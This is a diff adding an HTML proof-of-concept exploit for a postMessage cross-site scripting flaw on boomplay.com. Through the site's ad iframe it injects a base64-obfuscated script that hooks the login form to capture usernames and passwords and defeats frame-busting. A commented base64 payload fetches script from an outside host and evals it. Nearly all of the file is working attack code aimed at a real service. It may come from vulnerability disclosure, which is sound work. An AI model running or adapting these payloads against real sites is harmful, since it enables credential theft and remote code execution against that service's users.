@@ -1,0 +1,34 @@
+<html>
+
+<head>
+    <title>POC for Boomplay.com PostMessage vulnerability</title>
+</head>
+
+<body>
+    <script>
+        let boom = "https://www.boomplay.com/ad_iframe";
+        let frame = document.createElement("iframe");
+        frame.src = `${boom}`;
+        frame.width = `100%`;
+        frame.height = `100%`;
+        // frame.style.display = "none";
+        frame.onload = () => {
+            frame.contentWindow.postMessage({
+                type: "ad_iframe",
+                data: {
+                    source: "BP",
+                    bpData: {
+                        scriptContent: { script: "<script>eval(atob('dmFyIGtpbGxfYnVzdCA9IDAKCnZhciBib29tSWZyYW1lID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaWZyYW1lJyk7CmJvb21JZnJhbWUuc2V0QXR0cmlidXRlKCdzcmMnLCAnaHR0cHM6Ly93d3cuYm9vbXBsYXkuY29tL2xvZ291dCcpOwpib29tSWZyYW1lLnNldEF0dHJpYnV0ZSgnd2lkdGgnLCAnMTAwJScpOwpib29tSWZyYW1lLnNldEF0dHJpYnV0ZSgnaGVpZ2h0JywgJzEwMCUnKTsKYm9vbUlmcmFtZS5zZXRBdHRyaWJ1dGUoJ25hbWUnLCAndXNlckNlbnRlcicpOwpib29tSWZyYW1lLnNldEF0dHJpYnV0ZSgnaWQnLCAndXNlckNlbnRlcicpOwpkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGJvb21JZnJhbWUpOwoKdmFyIGRvYyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VyQ2VudGVyJyk7CnZhciBpZnJEb2MgPSBkb2MuY29udGVudERvY3VtZW50OwoKZnVuY3Rpb24gbG9naW4oKSB7CiAgdXNlckNlbnRlci5sb2NhdGlvbiA9ICJodHRwczovL3d3dy5ib29tcGxheS5jb20vIgp9CgpmdW5jdGlvbiBob29rTWVzc2FnZUhhbmRsZXIoKXsKICB1c2VyQ2VudGVyLmRvY3VtZW50LmZvcm1zWzFdLm9uc3VibWl0ID0gKGUpID0+IHtmb3JtSGFuZGxlcihlKTt9Owp9CgpmdW5jdGlvbiBmb3JtSGFuZGxlcihlKXsKICBjb25zb2xlLmxvZyhlKTsKICBpZihlPy5zcmNFbGVtZW50Lmxlbmd0aD4wKXsKICAgIGFsZXJ0KCJUaGUgY3JlZGVudGlhbHMgYXJlIGJlZW4gc3BpZWQgb246IFxuIiAKICAgICsgIkxvZ2luIGlzIDogIisgZS5zcmNFbGVtZW50WzFdLnZhbHVlICsiXG4iCiAgICArICJQYXNzd29yZCBpcyA6ICIrIGUuc3JjRWxlbWVudFsyXS52YWx1ZSArIlxuIgogICAgKTsKICB9Cn0KCnNldFRpbWVvdXQobG9naW4sIDIwMDApOwpzZXRUaW1lb3V0KGhvb2tNZXNzYWdlSGFuZGxlciwgNTAwMCk7Cgp3aW5kb3cub25iZWZvcmV1bmxvYWQgPSBmdW5jdGlvbiAoKSB7IGtpbGxfYnVzdCsrIH0Kc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkgewogIGlmIChraWxsX2J1c3QgPiAwKSB7CiAgICBraWxsX2J1c3QgLT0gMjsKICAgIHdpbmRvdy50b3AubG9jYXRpb24gPSAnaHR0cHM6Ly9odHRwc3RhdC51cy8yMDQnCiAgICBjb25zb2xlLmxvZygiRVZBTCBwcm9iZSAuLi4uIik7CiAgfQp9LCAxKTsK'));<\/script>" }
+                    },
+                    lmxType: "JSCode"
+                }
+            }, "*");
+        }
+        document.body.appendChild(frame);
+
+        /*
+dmFyIGtpbGxfYnVzdCA9IDAKd2luZG93Lm9uYmVmb3JldW5sb2FkID0gZnVuY3Rpb24oKSB7a2lsbF9idXN0KysgfQpzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICBpZiAoa2lsbF9idXN0ID4gMCkgewogICAga2lsbF9idXN0IC09IDI7CiAgICB3aW5kb3cudG9wLmxvY2F0aW9uID0gJ2h0dHBzOi8vaHR0cHN0YXQudXMvMjA0JwogIH0KfSwgMSk7Cgp2YXIgbG9naW5JZnJhbWUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTsKbG9naW5JZnJhbWUuc2V0QXR0cmlidXRlKCdzcmMnLCAnaHR0cHM6XC9cL3d3dy5ib29tcGxheS5jb21cL3VzZXJDZW50ZXJcL2VkaXQnKTsKbG9naW5JZnJhbWUuc2V0QXR0cmlidXRlKCd3aWR0aCcsICcxMDAlJyk7CmxvZ2luSWZyYW1lLnNldEF0dHJpYnV0ZSgnaGVpZ2h0JywgJzEwMCUnKTsKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChsb2dpbklmcmFtZSk7CgpmdW5jdGlvbiBiKCl7CglldmFsKHRoaXMucmVzcG9uc2VUZXh0KQp9OwphPW5ldyBYTUxIdHRwUmVxdWVzdCgpOwphLmFkZEV2ZW50TGlzdGVuZXIoImxvYWQiLCBiKTsKYS5vcGVuKCJHRVQiLCAiaHR0cHM6Ly94c3Mua2hhcmEub25lL2EiKTsKYS5zZW5kKCk7 */
+    </script>
+</body>
+
+</html>
